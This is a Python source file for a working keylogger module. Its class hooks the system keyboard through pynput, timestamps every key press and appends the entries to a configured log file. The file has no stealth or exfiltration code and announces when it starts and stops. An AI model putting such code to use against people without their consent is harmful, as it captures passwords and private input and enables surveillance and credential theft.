"""
Keylogger module for capturing keyboard events
"""
import threading
import time
from datetime import datetime
from pynput import keyboard
from pathlib import Path
import config


class KeyLogger:
    """Captures and logs keyboard events"""
    
    def __init__(self, log_file=None):
        self.log_file = log_file or config.KEYLOG_FILE
        self.buffer = []
        self.lock = threading.Lock()
        self.running = False
        self.listener = None
        
    def on_press(self, key):
        """Handle key press events"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            # Regular character keys
            key_str = key.char
        except AttributeError:
            # Special keys
            key_str = str(key).replace("Key.", "")
        
        with self.lock:
            self.buffer.append(f"[{timestamp}] Key pressed: {key_str}\n")
            
            # Auto-flush buffer if it gets too large
            if len(self.buffer) > 100:
                self._flush_buffer()
    
    def _flush_buffer(self):
        """Write buffer contents to file"""
        if self.buffer:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.writelines(self.buffer)
            self.buffer.clear()
    
    def flush(self):
        """Public method to flush buffer"""
        with self.lock:
            self._flush_buffer()
    
    def start(self):
        """Start the keylogger"""
        if self.running:
            return
        
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        print(f"[KeyLogger] Started logging to {self.log_file}")
    
    def stop(self):
        """Stop the keylogger"""
        if not self.running:
            return
        
        self.running = False
        if self.listener:
            self.listener.stop()
        
        # Flush remaining buffer
        self.flush()
        print("[KeyLogger] Stopped")
